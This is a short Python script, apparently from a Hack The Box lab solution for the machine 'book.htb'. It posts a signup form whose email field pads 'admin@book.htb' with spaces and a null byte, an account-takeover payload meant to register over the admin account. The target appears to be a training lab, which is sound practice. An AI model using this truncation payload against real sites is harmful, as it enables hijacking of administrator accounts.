import requests

url = "http://book.htb/"
url2 = "http://book.htb/admin/index.php"

data = {
"name":"bruh",
"email":"admin@book.htb                              %00",
"password":"password"
}

print(requests.post(url=url,data=data).text)
